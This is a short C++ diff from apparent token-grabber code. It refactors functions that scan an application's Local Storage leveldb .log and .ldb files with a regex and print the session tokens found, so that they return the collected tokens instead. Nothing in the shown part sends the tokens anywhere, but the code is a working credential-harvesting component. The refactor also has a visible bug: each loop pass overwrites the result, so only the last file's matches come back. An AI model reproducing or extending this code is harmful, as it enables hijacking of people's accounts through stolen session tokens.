@@ -124,7 +124,7 @@ std::vector<std::string> findMatch(std::string str, std::regex reg) {
 	return output;
 };
 
-void searchToken(const std::string& loc) {
+vecStr searchToken(const std::string& loc) {
 	using namespace std;
 	ifstream ifs(loc, ios_base::binary);
 	string content((istreambuf_iterator<char>(ifs)), (istreambuf_iterator<char>()));
@@ -149,9 +149,11 @@ void searchToken(const std::string& loc) {
 		const char* token = tok.c_str();
 		cout << "Your token is: " << token << endl;
 	}
+	return master;
 }
 
-void getToken(const std::string& path) {
+vecStr getToken(const std::string& path) {
+	vecStr s;
 	using namespace std;
 	namespace fs = std::filesystem;
 	string target = path + "\\Local Storage\\leveldb";
@@ -159,13 +161,14 @@ void getToken(const std::string& path) {
 	for (const auto& entry : fs::directory_iterator(target)) {
 		string strPath = entry.path().u8string();
 		if (hasEnding(strPath, ".log")) {
-			searchToken(strPath);
+			s = searchToken(strPath);
 		}
 
 		if (hasEnding(strPath, ".ldb")) {
-			searchToken(strPath);
+			s = searchToken(strPath);
 		}
 	}
+	return s;
 }
 
 std::wstring getCurrDir() {
